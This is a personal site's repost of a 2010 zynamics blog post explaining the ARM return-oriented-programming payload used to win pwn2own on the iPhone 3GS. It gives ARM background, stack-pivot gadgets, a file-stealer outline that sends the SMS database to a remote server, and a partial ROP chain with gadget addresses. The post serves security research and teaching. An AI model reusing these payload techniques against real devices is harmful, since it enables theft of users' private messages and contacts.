@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>
+            ROP and iPhone
+        </title>
+        <meta name="viewport" content="width=device-width,initial-scale=1.0">
+        <link rel="stylesheet" href="/static/css/main.min.css" type="text/css" media="all"><!--[if lte IE 8]>
+            <link rel="stylesheet" href="/static/css/ie-fixes.css" type="text/css" media="all">
+            <script src="/static/js/html5shiv.js"></script>
+        <![endif]-->
+        <meta http-equiv="last-modified" content="Fri, 16 Apr 2010 10:53:46 GMT">
+        <link rel="alternate" type="application/atom+xml" title="All Posts (Atom)" href="/feeds/all.atom">
+        <link rel="alternate" type="application/rss+xml" title="All Posts (RSS)" href="/feeds/all.rss">
+        <link rel="icon" type="image/jpeg" sizes="287x287" href="/static/img/favicon-287x287.jpg">
+        <link rel="icon" type="image/jpeg" sizes="128x128" href="/static/img/favicon-128x128.jpg">
+        <script type="application/javascript">
+var _prum={id:"5166be01e6e53d1007000001"};var PRUM_EPISODES=PRUM_EPISODES||{};PRUM_EPISODES.q=[];PRUM_EPISODES.mark=function(b,a){PRUM_EPISODES.q.push(["mark",b,a||new Date().getTime()])};PRUM_EPISODES.measure=function(b,a,b){PRUM_EPISODES.q.push(["measure",b,a,b||new Date().getTime()])};PRUM_EPISODES.done=function(a){PRUM_EPISODES.q.push(["done",a])};PRUM_EPISODES.mark("firstbyte");(function(){var b=document.getElementsByTagName("script")[0];var a=document.createElement("script");a.type="text/javascript";a.async=true;a.charset="UTF-8";a.src="//rum-static.pingdom.net/prum.min.js";b.parentNode.insertBefore(a,b)})();
+        </script>
+    </head>
+    <body class="blog post_detail" itemscope itemtype="http://schema.org/BlogPosting">
+        <nav id="site-nav">
+            <header id="about">
+                <h1>
+                    <a href="/about/">Chris Adams</a>
+                </h1>
+                <h2>
+                    Programmer, cyclist, photographer
+                </h2>
+            </header>
+            <ul class="links">
+                <li>
+                    <a href="/">Home</a>
+                </li>
+                <li>
+                    <a href="/about/">About</a>
+                </li>
+                <li>
+                    <a href="/feeds/all.atom" title="Site Feed">Site Feed</a>
+                </li>
+            </ul>
+            <ul class="social-networks">
+                <li>
+                    <a href="https://github.com/acdha" rel="me">Github</a>
+                </li>
+                <li>
+                    <a href="http://bitbucket.org/acdha" rel="me">Bitbucket</a>
+                </li>
+                <li>
+                    <a href="http://delicious.com/acdha" rel="me">del.icio.us</a>
+                </li>
+                <li>
+                    <a href="http://twitter.com/acdha" rel="me">Twitter</a>
+                </li>
+                <li>
+                    <a href="https://plus.google.com/116562742092842686896?rel=author" rel="me">Google+</a>
+                </li>
+                <li>
+                    <a href="http://www.flickr.com/photos/acdha" rel="me">Flickr</a>
+                </li>
+                <li>
+                    <a href="http://www.linkedin.com/in/acdha" rel="me">LinkedIn</a>
+                </li>
+                <li>
+                    <a href="http://connect.garmin.com/explore?owner=acdha" rel="me">Garmin Connect</a>
+                </li>
+            </ul>
+            <div id="site-search"></div>
+        </nav>
+        <section id="main">
+            <article class="post">
+                <header>
+                    <meta itemprop="dateCreated" content="2010-04-16T06:53:46-04:00">
+                    <meta itemprop="dateModified" content="2010-04-16T06:53:46-04:00"><time class="date" itemprop="datePublished" datetime="2010-04-16T10:53:46+00:00">Apr 16</time>
+                    <h2 itemprop="title">
+                        ROP and iPhone
+                    </h2>
+                </header>
+                <div class="body" itemprop="articleBody">
+                    <div class="googlereader description" data-google-id="tag:google.com,2005:reader/item/65aaa334449965fc">
+                        <blockquote>
+                            <p>
+                                As you might know I and <a title="Ralf-Philip Weinmann" href="http://twitter.com/esizkur">Ralf-Philipp Weinmann</a> from University of Luxembourg won pwn2own owning the iPhone.
+                            </p>
+                            <p>
+                                Smartphones are different beasts compared to desktops when it comes to exploitation. Specifically&nbsp;the iPhone has a fairly important exploitation remediation measure, code signing, which makes both exploitation&nbsp;and debugging quite annoying and definitely raises the bar when it comes to writing payloads.
+                            </p>
+                            <p>
+                                What smartphones usually miss, and that is the case for iPhone as well, is ASLR.&nbsp;Add up the two and we have the perfect OS on which to use ROP payloads.
+                            </p>
+                            <p>
+                                We are not authorized to talk about the exploit itself as it is being sold to ZDI, nonetheless we want to&nbsp;give a brief explanation on the payload because to the best of our knowledge it is the first practical example&nbsp;of a weaponized payload on ARMv7 and iPhone 3GS.
+                            </p>
+                            <p>
+                                In order to decide what kind of payloads we want to write, another security countermeasure has to be taken into account,&nbsp;namely Sandboxing.
+                            </p>
+                            <p>
+                                On iPhone most applications are sandboxed with different levels of restrictions. The sandboxing is done&nbsp;in a kernel extension using the MAC framework. A few well-known syscalls are usually denied(execve() to name one) and&nbsp;normally access to important files is restricted. One last important thing to notice is that the iPhone doesn’t have a shell,&nbsp;so that is not an option for our payload.
+                            </p>
+                            <p>
+                                Luckily we are able to read files like the SMS database, the address book database&nbsp;and a few others containing sensitive information (this depends on the specific sandbox profile of the application).
+                            </p>
+                            <p>
+                                A few notions are needed to be able to write ARM payloads, a lot of good information on the topic can be found <a title="here" href="http://www.arm.com/products/processors/technologies/instruction-set-architectures.php">here</a>. I will nonetheless&nbsp;outline the basics needed below.
+                            </p>
+                            <p>
+                                The first thing one has to understand before writing a ROP payload is the calling convention used in iPhoneOS.
+                            </p>
+                            <p>
+                                For iPhone the first four arguments are passed using r0-r3 registers. If other arguments are needed&nbsp;those are pushed onto the stack. Functions usually return to the address pointed by the LR register&nbsp;so when we write our payload we need to make sure that we control LR.
+                            </p>
+                            <p>
+                                Another important difference between ARM ROP payloads and x86 ROP payloads are instruction sizes.
+                            </p>
+                            <p>
+                                In ARM there are only two possible sizes for instructions: 4 bytes or 2 bytes. The second type is&nbsp;called THUMB mode. To access THUMB instructions one has to set the program counter to addresses that are not 4-bytes&nbsp;aligned, this will cause the processor to switch to THUMB mode. More formally the processor will switch to THUMB mode when the T bit in the CPSR is 1 and the J bit is 0.
+                            </p>
+                            <p>
+                                Starting from ARMv7 a “hybrid” mode was introduced, THUMB2. This mode supports both 32bits and 16bits instructions (the switch between 32 bits and 16 bits is done following the same criteria explained before for THUMB).
+                            </p>
+                            <p>
+                                One last thing has to be noticed is that usually functions are called through b/bl/blx instructions,&nbsp;when writing our payload we are almost always forced not to use bl and blx. In fact&nbsp;those two instructions will save the next instructions into the lr register, thus we lose control&nbsp;over the program flow.
+                            </p>
+                            <p>
+                                I won’t describe in details the concepts behind ROP as there is plenty of literature available. <a title="Tim" href="http://blog.zynamics.com/author/timkornau/">Tim</a> is writing&nbsp;about ROP on ARM in our blog as well.
+                            </p>
+                            <p>
+                                I will instead try to outline what important steps are needed when it comes to writing an ARM ROP payload on the iPhone.
+                            </p>
+                            <p>
+                                In our exploit we know that some data we control lies in r0. The first thing we want to achieve&nbsp;is to control the stack pointer. So we have to find a sequence that allows us to switch the stack pointer with a&nbsp;memory region we control. We do this in two stages:
+                            </p>
+                            <pre>
+6a07 ldr r7, [r0, #32]
+f8d0d028 ldr.w sp, [r0, #40]
+6a40 ldr r0, [r0, #36]
+4700 bx r0
+
+// r0 is a pointer to the crafted data structure used in the exploit. We point r7 to our crafted stack, and r0 to the address of the next rop gadget.
+// The stack pointer points to something we don't control as the node is 40 bytes long. So we just to another code snippet which will put us in control of SP.
+
+f1a70d00 sub.w sp, r7, #0 ;0x0
+bd80 pop {r7, pc}
+</pre>
+                            <p>
+                                Now that we control the stack pointer we can take a closer look at our payload.
+                            </p>
+                            <p>
+                                A file stealer payload should in principle do the following:
+                            </p>
+                            <ol>
+                                <li>Open a file
+                                </li>
+                                <li>Open a socket
+                                </li>
+                                <li>Connect to the socket
+                                </li>
+                                <li>Get the file size (using for instance fstat())
+                                </li>
+                                <li>Read the content of the file (in our case by mmaping it into memory)
+                                </li>
+                                <li>Write the content of the file to the remote server
+                                </li>
+                                <li>Close the connection
+                                </li>
+                                <li>Exit the process/continue execution
+                                </li>
+                            </ol>
+                            <p>
+                                This is quite a long list for a ROP shellcode therefore we are not going to discuss each and every step,&nbsp;but just highlight some that are very important.
+                            </p>
+                            <p>
+                                The first thing our payload needs to do is to control the content of lr register, a gadget that allows us to do so is:
+                            </p>
+                            <pre>
+e8bd4080 pop {r7, lr}
+b001 add sp, #4
+4770 bx lr
+</pre>
+                            <p>
+                                Next we will see an example of how a function can be called using ROP on ARM. We take as an example mmap() because it has more than&nbsp;4 arguments therefore it is a bit trickier:
+                            </p>
+                            <pre>
+ropvalues[i++] = 0x00000000; //r4 which will be the address for mmap
+ropvalues[i++] = 0x00000000; //r5 whatever
+ropvalues[i++] = 0x000000000; //r8 is gonna be the file len for mmap
+ropvalues[i++] = 0x000000002; //r9 MAP_PRIVATE copied in r3
+ropvalues[i++] = 0x32988d5f; // PC
+//32988d5e bd0f pop {r0, r1, r2, r3, pc}
+
+ropvalues[i++] = locFD - 36; // r0 contains the memory location where the FD is stored
+ropvalues[i++] = locStat +60;   // r1 struct stat file size member
+ropvalues[i++] = 0x00000001; // r2 PROT_READ
+ropvalues[i++] = 0x00000000; // r3 is later used to store the FD in the following gadget
+ropvalues[i++] = 0x32979837;
+//32979836 6a43 ldr r3, [r0, #36]
+//32979838 6a00 ldr r0, [r0, #32]
+//3297983a 4418 add r0, r3
+//3297983c bd80 pop {r7, pc}
+ropvalues[i++] = sp + 73*4 + 0x10;
+ropvalues[i++] = 0x32988673;
+//32988672       bd01   pop     {r0, pc}
+ropvalues[i++] = sp -28; //r0 has to be a valid piece of memory we don't care about(we just care for r1 here)
+ropvalues[i++] = 0x329253eb;
+//329253ea 6809 ldr r1, [r1, #0]
+//329253ec 61c1 str r1, [r0, #28]
+//329253ee 2000 movs r0, #0 //this will reset to 0 r0 (corresponding to the first argument of mmap())
+//329253f0 bd80 pop {r7, pc}
+ropvalues[i++] = sp + 75*4 + 0xc; //we do this because later SP will depend on it
+ropvalues[i++] = 0x328C5CBd;
+//328C5CBC STR R3, [SP,#0x24+var_24]
+//328C5CBE MOV R3, R9 //r9 was filled before with MAP_PRIVATE flag for mmmap()
+//328C5CC0 STR R4, [SP,#0x24+var_20]
+//328C5CC2 STR R5, [SP,#0x24+var_1C]
+//328C5CC4 BLX ___mmap
+//328C5CC8 loc_328C5CC8 ; CODE XREF: _mmap+50 
+//328C5CC8 SUB.W SP, R7, #0x10
+//328C5CCC LDR.W R8, [SP+0x24+var_24],#4
+//328C5CD0 POP {R4-R7,PC}
+
+ropvalues[i++] = 0xbbccddee;//we don't care for r4-r7 registers
+ropvalues[i++] = 0x00000000;
+ropvalues[i++] = 0x00000000;
+ropvalues[i++] = 0x00000000;
+ropvalues[i++] = 0x32987baf;
+//32987bae bd02 pop {r1, pc}
+</pre>
+                            <p>
+                                This payload snippet roughly traslates to:
+                            </p>
+                            <pre>
+mmap(0x0, statstruct.st_size, PROT_READ, MAP_PRIVATE, smsdbFD, 0x0);
+</pre>
+                            <p>
+                                What we had to do here is to store the arguments both inside the registers (the easy part) and to push two of them onto the stack.
+                            </p>
+                            <p>
+                                Pushing arguments on the stack creates an extra problem when writing a ROP payload because we have to make sure our payload is aligned&nbsp;with the stack pointer, this is why we to craft r7 in a specific way in line 26.
+                            </p>
+                            <p>
+                                Finally we pop the program counter and jump to some other instructions in memory.
+                            </p>
+                            <p>
+                                Having seen this payload one may wonder how to find the proper gadgets in the address space of a process.
+                            </p>
+                            <p>
+                                As said before&nbsp;iPhone doesn’t have ASLR enforced which means that every library mapped in the address space is a possible source of gadgets.
+                            </p>
+                            <p>
+                                There are some automated tools to find those gadgets and compile them to form a ROP shellcode on x86. Unfortunately that is&nbsp;not the case for ARM. Our co-worker Tim maintains and develops a great tool written for his thesis that can ease the process of finding gadget on ARM and he is currently working on extending the tool to compile (or better combine) gadgets to form valid shellcode.
+                            </p>
+                            <p>
+                                As far as we know no techniques to disable code signing “on the fly” have been found on the latest firmware of iPhone.
+                            </p>
+                            <p>
+                                It is therefore important for anyone trying to exploiting an iPhone vulnerability to learn ROP programming.
+                            </p>
+                            <p>
+                                One last thing has to be said: the iPhone security model is pretty robust as it is now.
+                            </p>
+                            <p>
+                                If it would ever support ASLR attacking it will be significantly&nbsp;harder than any desktop OS. In fact, most applications are sandboxed which greatly limits&nbsp;their abilities of doing harm and code signing is always in place. ASLR will limit the ability of creating ROP payloads and there are&nbsp;neither Flash nor a JIT compiler to play with on the iPhone;)
+                            </p>
+                            <p>
+                                Finally if you are interested in iPhone hacking you should attend the <a title="class" href="http://blackhat.com/html/bh-us-10/training/bh-us-10-training_vi-mac.html">class</a> that I am going to give together with Dino Dai Zovi&nbsp;at Black Hat USA. It will be on Mac OS X hacking but most of the teaching material can be used on iPhone as well!
+                            </p>
+                            <p>
+                                Cheers,<br>
+                                Vincenzo
+                            </p><br>
+                            <a rel="nofollow" href="http://feeds.wordpress.com/1.0/gocomments/zynamics.wordpress.com/643/"><img alt="" border="0" src="http://feeds.wordpress.com/1.0/comments/zynamics.wordpress.com/643/"></a> <a rel="nofollow" href="http://feeds.wordpress.com/1.0/godelicious/zynamics.wordpress.com/643/"><img alt="" border="0" src="http://feeds.wordpress.com/1.0/delicious/zynamics.wordpress.com/643/"></a> <a rel="nofollow" href="http://feeds.wordpress.com/1.0/gostumble/zynamics.wordpress.com/643/"><img alt="" border="0" src="http://feeds.wordpress.com/1.0/stumble/zynamics.wordpress.com/643/"></a> <a rel="nofollow" href="http://feeds.wordpress.com/1.0/godigg/zynamics.wordpress.com/643/"><img alt="" border="0" src="http://feeds.wordpress.com/1.0/digg/zynamics.wordpress.com/643/"></a> <a rel="nofollow" href="http://feeds.wordpress.com/1.0/goreddit/zynamics.wordpress.com/643/"><img alt="" border="0" src="http://feeds.wordpress.com/1.0/reddit/zynamics.wordpress.com/643/"></a> <img alt="" border="0" src="http://stats.wordpress.com/b.gif?host=blog.zynamics.com&amp;blog=11242489&amp;post=643&amp;subd=zynamics&amp;ref=&amp;feed=1">
+                        </blockquote>
+                    </div>
+                    <p class="bookmark-source">
+                        Source: <a href="http://blog.zynamics.com/2010/04/16/rop-and-iphone/">http://blog.zynamics.com/2010/04/16/rop-and-iphone/</a>
+                    </p>
+                </div>
+            </article>
+            <nav id="post-nav"></nav><script id="discus-javascript">
+    var disqus_shortname = 'improbable';
+
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
+                    document.getElementsByTagName('body')[0].appendChild(dsq);
+                })();
+            </script><a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+            <div id="disqus_thread"></div>
+        </section>
+        <footer id="site-footer">
+            <p>
+                This site is purely my personal work and does not reflect the views of my employer.
+            </p>
+            <p class="license">
+                <a class="icon" rel="license" href="http://creativecommons.org/licenses/by-sa/3.0/deed.en_US"><img alt="Creative Commons License" style="border-width:0" src="http://i.creativecommons.org/l/by-sa/3.0/88x31.png"></a> This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/3.0/deed.en_US">Creative Commons Attribution-ShareAlike 3.0 Unported License</a>.
+            </p>
+        </footer><script async="" defer src="/static/js/common.js">
+</script><script id="google-analytics">
+    var _gaq = _gaq || [];
+            _gaq.push(['_setAccount', 'UA-2097834-1']);
+            _gaq.push(['_setDomainName', 'improbable.org']);
+            _gaq.push(['_trackPageview']);
+
+            (function() {
+                var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+                ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+                var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+            })();
+        </script>
+    </body>
+</html>
